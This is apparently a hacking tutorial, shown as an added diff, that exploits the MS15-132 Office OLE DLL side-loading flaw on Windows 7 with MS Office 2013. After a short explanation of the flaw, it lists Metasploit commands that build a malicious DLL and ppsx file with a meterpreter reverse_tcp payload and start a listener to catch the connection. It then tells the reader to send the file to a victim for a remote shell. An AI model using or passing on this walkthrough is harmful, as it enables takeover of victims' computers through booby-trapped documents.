@@ -1,0 +1,27 @@
+
+Hack Remote Windows PC using Office OLE multiple DLL side loading vulnerabilities
+
+Multiple DLL side loading vulnerabilities were found in various COM components. These issues can be exploited by loading various these components as an embedded OLE object. When instantiating a vulnerable object Windows will try to load one or more DLLs from the current working directory. If an attacker convinces the victim to open a specially crafted (Office) document from a directory also containing the attacker’s DLL file, it is possible to execute arbitrary code with the privileges of the target user. This can potentially result in the attacker taking complete control of the affected system.
+Exploit Targets
+MS Office 2013
+Requirement
+Attacker: kali Linux
+Victim PC: Windows 7
+Open Kali terminal type msfconsole
+
+Now type use exploit/windows/fileformat/ms15_132_dll_sideload
+msf exploit (ms15_132_dll_sideload)>set payload windows/meterpreter/reverse_tcp
+msf exploit (ms15_132_dll_sideload)>set lhost 192.168.0.119 (IP of Local Host)
+msf exploit (ms15_132_dll_sideload)>exploit 
+
+After we successfully generate the malicious dll and ppsx File, it will stored on your local computer
+/root/.msf4/local
+
+
+Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.0.119
+exploit
+Now send your malicious PPT files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer
+
